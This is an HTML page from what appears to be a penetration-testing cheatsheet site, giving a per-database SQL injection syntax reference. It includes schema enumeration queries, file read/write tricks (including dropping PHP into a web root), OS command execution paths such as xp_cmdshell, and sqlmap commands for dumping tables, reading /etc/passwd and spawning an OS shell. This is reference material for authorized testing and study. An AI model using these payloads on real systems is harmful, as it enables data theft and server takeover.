@@ -1,0 +1,452 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>DBMS Syntax Cheatsheet · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › SQL Injection</nav><h1>DBMS Syntax Cheatsheet</h1><p class="cx-lede">Per-DBMS quick reference for common SQLi syntax, functions, and tricks.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1213</span><span class="cx-tag">D3FEND D3-MH</span><span class="cx-tag">IMPACT DataExfil</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><p>Quick lookup for "I know I'm on Oracle, how do I do X?". For workflow and explanations see the per-technique pages.</p>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>Keep this page open in a tab during exploitation. The most common time-waster in SQLi is using MySQL syntax against PostgreSQL or vice versa.</p>
+</div>
+<h2 id="fingerprinting-return-value-identifies-the-dbms">Fingerprinting (return value identifies the DBMS)</h2>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">SELECT @@version              -- MySQL, MSSQL
+SELECT version()              -- PostgreSQL, MySQL
+SELECT banner FROM v$version  -- Oracle
+SELECT sqlite_version()       -- SQLite</code></pre></figure>
+<h2 id="common-functions">Common functions</h2>
+<table>
+<thead>
+<tr>
+<th>Operation</th>
+<th>MySQL</th>
+<th>PostgreSQL</th>
+<th>MSSQL</th>
+<th>Oracle</th>
+<th>SQLite</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Version</td>
+<td><code>@@version</code></td>
+<td><code>version()</code></td>
+<td><code>@@version</code></td>
+<td><code>(SELECT banner FROM v$version)</code></td>
+<td><code>sqlite_version()</code></td>
+</tr>
+<tr>
+<td>Current user</td>
+<td><code>user()</code> / <code>current_user()</code></td>
+<td><code>current_user</code></td>
+<td><code>SYSTEM_USER</code> / <code>USER_NAME()</code></td>
+<td><code>USER</code></td>
+<td>n/a</td>
+</tr>
+<tr>
+<td>Current DB</td>
+<td><code>database()</code></td>
+<td><code>current_database()</code></td>
+<td><code>DB_NAME()</code></td>
+<td>n/a (uses schemas)</td>
+<td>n/a</td>
+</tr>
+<tr>
+<td>Hostname</td>
+<td><code>@@hostname</code></td>
+<td><code>inet_server_addr()</code></td>
+<td><code>@@SERVERNAME</code></td>
+<td><code>SYS_CONTEXT('USERENV','HOST')</code></td>
+<td>n/a</td>
+</tr>
+<tr>
+<td>String concat</td>
+<td><code>CONCAT(a,b)</code></td>
+<td><code>a \|\| b</code></td>
+<td><code>a + b</code></td>
+<td><code>a \|\| b</code></td>
+<td><code>a \|\| b</code></td>
+</tr>
+<tr>
+<td>Substring</td>
+<td><code>SUBSTRING(s,p,l)</code></td>
+<td><code>SUBSTR(s,p,l)</code></td>
+<td><code>SUBSTRING(s,p,l)</code></td>
+<td><code>SUBSTR(s,p,l)</code></td>
+<td><code>SUBSTR(s,p,l)</code></td>
+</tr>
+<tr>
+<td>String length</td>
+<td><code>LENGTH(s)</code></td>
+<td><code>LENGTH(s)</code></td>
+<td><code>LEN(s)</code></td>
+<td><code>LENGTH(s)</code></td>
+<td><code>LENGTH(s)</code></td>
+</tr>
+<tr>
+<td>Char from code</td>
+<td><code>CHAR(N)</code></td>
+<td><code>CHR(N)</code></td>
+<td><code>CHAR(N)</code></td>
+<td><code>CHR(N)</code></td>
+<td><code>CHAR(N)</code></td>
+</tr>
+<tr>
+<td>ASCII of char</td>
+<td><code>ASCII(c)</code></td>
+<td><code>ASCII(c)</code></td>
+<td><code>ASCII(c)</code></td>
+<td><code>ASCII(c)</code></td>
+<td><code>UNICODE(c)</code></td>
+</tr>
+<tr>
+<td>String → hex</td>
+<td><code>HEX(s)</code></td>
+<td><code>encode(s,'hex')</code></td>
+<td><code>master.dbo.fn_varbintohexstr(s)</code></td>
+<td><code>RAWTOHEX(s)</code></td>
+<td><code>hex(s)</code></td>
+</tr>
+<tr>
+<td>Hex → string</td>
+<td><code>UNHEX(h)</code></td>
+<td><code>decode(h,'hex')</code></td>
+<td>n/a</td>
+<td><code>UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW(h))</code></td>
+<td>n/a</td>
+</tr>
+<tr>
+<td>Conditional</td>
+<td><code>IF(c,t,f)</code></td>
+<td><code>CASE WHEN c THEN t ELSE f END</code></td>
+<td><code>IIF(c,t,f)</code> or <code>CASE</code></td>
+<td><code>CASE WHEN c THEN t ELSE f END</code></td>
+<td><code>CASE WHEN c THEN t ELSE f END</code></td>
+</tr>
+<tr>
+<td>Sleep</td>
+<td><code>SLEEP(n)</code></td>
+<td><code>pg_sleep(n)</code></td>
+<td><code>WAITFOR DELAY '0:0:n'</code></td>
+<td><code>dbms_pipe.receive_message(('a'),n)</code></td>
+<td>(no native)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="comments">Comments</h2>
+<table>
+<thead>
+<tr>
+<th>DBMS</th>
+<th>Line</th>
+<th>Block</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL</td>
+<td><code>--</code> (with space) or <code>#</code></td>
+<td><code>/* ... */</code>, <code>/*! ... */</code> versioned</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>--</code></td>
+<td><code>/* ... */</code></td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>--</code></td>
+<td><code>/* ... */</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>--</code></td>
+<td><code>/* ... */</code></td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td><code>--</code></td>
+<td><code>/* ... */</code></td>
+</tr>
+</tbody>
+</table>
+<p>URL-safe form: <code>-- -</code> (trailing dash so the comment doesn't break on space stripping).</p>
+<h2 id="limit-and-offset">Limit and offset</h2>
+<table>
+<thead>
+<tr>
+<th>DBMS</th>
+<th>Get rows N to M</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL / PostgreSQL / SQLite</td>
+<td><code>LIMIT M OFFSET N</code></td>
+</tr>
+<tr>
+<td>MSSQL (2012+)</td>
+<td><code>OFFSET N ROWS FETCH NEXT M ROWS ONLY</code></td>
+</tr>
+<tr>
+<td>MSSQL (older)</td>
+<td><code>SELECT TOP M * FROM t WHERE id NOT IN (SELECT TOP N id FROM t)</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>WHERE ROWNUM &lt;= M AND ROWNUM &gt; N</code> (or row_number() window)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="schema-enumeration">Schema enumeration</h2>
+<table>
+<thead>
+<tr>
+<th>Operation</th>
+<th>MySQL</th>
+<th>PostgreSQL</th>
+<th>MSSQL</th>
+<th>Oracle</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>List databases</td>
+<td><code>SELECT schema_name FROM information_schema.schemata</code></td>
+<td><code>SELECT datname FROM pg_database</code></td>
+<td><code>SELECT name FROM sys.databases</code></td>
+<td>n/a (use schemas)</td>
+</tr>
+<tr>
+<td>List tables</td>
+<td><code>SELECT table_name FROM information_schema.tables WHERE table_schema=database()</code></td>
+<td><code>SELECT tablename FROM pg_tables WHERE schemaname='public'</code></td>
+<td><code>SELECT name FROM sysobjects WHERE xtype='U'</code></td>
+<td><code>SELECT table_name FROM all_tables</code></td>
+</tr>
+<tr>
+<td>List columns</td>
+<td><code>SELECT column_name FROM information_schema.columns WHERE table_name='&lt;T&gt;'</code></td>
+<td>same as MySQL</td>
+<td>same as MySQL</td>
+<td><code>SELECT column_name FROM all_tab_columns WHERE table_name='&lt;T&gt;'</code></td>
+</tr>
+</tbody>
+</table>
+<p>See <a href="../enumeration/index.html">Enumeration</a> for the full workflow.</p>
+<h2 id="stacked-query-support-multiple-statements-separated-by">Stacked query support (multiple statements separated by <code>;</code>)</h2>
+<table>
+<thead>
+<tr>
+<th>DBMS</th>
+<th>Stacked queries via SQLi</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL</td>
+<td>Usually not (most drivers disable it) - exception: <code>mysqli_multi_query</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>No (single statement)</td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td>Depends on driver</td>
+</tr>
+</tbody>
+</table>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>When stacked queries don't work, you cannot run <code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code>, or DDL via injection - only <code>SELECT</code>-equivalent primitives.</p>
+</div>
+<h2 id="read-write-files">Read &amp; write files</h2>
+<table>
+<thead>
+<tr>
+<th>DBMS</th>
+<th>Read</th>
+<th>Write</th>
+<th>Write requires</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL</td>
+<td><code>LOAD_FILE('/path')</code></td>
+<td><code>SELECT ... INTO OUTFILE '/path'</code></td>
+<td><code>FILE</code> privilege + <code>secure_file_priv</code> permits path</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>pg_read_file('/path', 0, N)</code></td>
+<td><code>COPY (SELECT '...') TO '/path'</code></td>
+<td>superuser</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>OPENROWSET(BULK '/path', SINGLE_CLOB)</code></td>
+<td>via <code>xp_cmdshell</code></td>
+<td>sysadmin</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>UTL_FILE.GET_LINE(...)</code></td>
+<td><code>UTL_FILE.PUT_LINE(...)</code></td>
+<td>DBA + directory object</td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td>n/a</td>
+<td><code>ATTACH DATABASE 'path/x.php' AS x; CREATE TABLE x.t (c TEXT); INSERT INTO x.t VALUES ('&lt;?php ... ?&gt;')</code></td>
+<td>filesystem write to web root</td>
+</tr>
+</tbody>
+</table>
+<p>See <a href="../file-operations/index.html">File operations</a> for full workflow including web shell drops.</p>
+<h2 id="command-execution">Command execution</h2>
+<table>
+<thead>
+<tr>
+<th>DBMS</th>
+<th>Path</th>
+<th>Privilege required</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL</td>
+<td>UDF abuse via <code>lib_mysqludf_sys</code> (rare modern systems)</td>
+<td><code>FILE</code> privilege + writable plugin dir</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>COPY ... TO PROGRAM 'cmd'</code></td>
+<td>superuser</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>CREATE EXTENSION</code> + dynamic library</td>
+<td>superuser</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>EXEC xp_cmdshell 'cmd'</code></td>
+<td>sysadmin (must enable first)</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td><code>sp_OACreate</code> + WSH</td>
+<td>sysadmin</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>Java stored procedures</td>
+<td>DBA</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>DBMS_SCHEDULER</code> to run OS commands</td>
+<td>DBA + appropriate roles</td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td>n/a (no built-in command execution)</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<h2 id="sqlmap-quick-flags">sqlmap quick flags</h2>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Basic dump
+sqlmap -u &quot;https://&lt;TARGET&gt;/p?id=1&quot; --batch --dump
+
+# Specific DBMS, specific technique, specific table
+sqlmap -u &quot;https://&lt;TARGET&gt;/p?id=1&quot; --dbms=mysql --technique=BEUSTQ --dump -T users
+
+# From saved Burp request
+sqlmap -r request.txt --batch --dbs
+
+# With cookies
+sqlmap -u &quot;https://&lt;TARGET&gt;/p?id=1&quot; --cookie=&quot;session=xyz&quot; --dump
+
+# JSON body
+sqlmap -u &quot;https://&lt;TARGET&gt;/api/x&quot; --data=&#x27;{&quot;id&quot;:&quot;1*&quot;}&#x27; --headers=&quot;Content-Type: application/json&quot;
+
+# Mark injection point manually
+sqlmap -u &quot;https://&lt;TARGET&gt;/p?id=1*&amp;other=2&quot;  # asterisk = injection point
+
+# OS shell when DB user is privileged
+sqlmap -u &quot;https://&lt;TARGET&gt;/p?id=1&quot; --os-shell
+
+# Read file
+sqlmap -u &quot;https://&lt;TARGET&gt;/p?id=1&quot; --file-read=/etc/passwd
+
+# Write file
+sqlmap -u &quot;https://&lt;TARGET&gt;/p?id=1&quot; --file-write=local.php --file-dest=/var/www/html/x.php
+
+# Tamper for WAF bypass
+sqlmap -u &quot;https://&lt;TARGET&gt;/p?id=1&quot; --tamper=between,randomcase,space2comment
+
+# Verbose, show all requests
+sqlmap -u &quot;https://&lt;TARGET&gt;/p?id=1&quot; -v 3</code></pre></figure>
+<p><code>--technique</code> letters:
+- <code>B</code> - boolean blind
+- <code>E</code> - error-based
+- <code>U</code> - UNION-based
+- <code>S</code> - stacked queries
+- <code>T</code> - time-based blind
+- <code>Q</code> - inline query</p>
+<h2 id="common-ports">Common ports</h2>
+<table>
+<thead>
+<tr>
+<th>DBMS</th>
+<th>Default port</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL / MariaDB</td>
+<td>3306</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>5432</td>
+</tr>
+<tr>
+<td>MSSQL</td>
+<td>1433</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>1521</td>
+</tr>
+<tr>
+<td>MongoDB</td>
+<td>27017</td>
+</tr>
+<tr>
+<td>Redis</td>
+<td>6379</td>
+</tr>
+<tr>
+<td>Cassandra</td>
+<td>9042</td>
+</tr>
+</tbody>
+</table>
+<p>Useful when you have direct DB access (not via injection) - different reference, but worth keeping nearby.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li>This page is a quick lookup, not a tutorial. The technique pages explain <em>why</em>; this page is <em>what to type</em>.</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../bypasses/index.html">Previous: SQLi Filter &amp; WAF Bypasses</a><a class="cx-next" href="../defense/index.html">Next: Defending Against SQLi</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
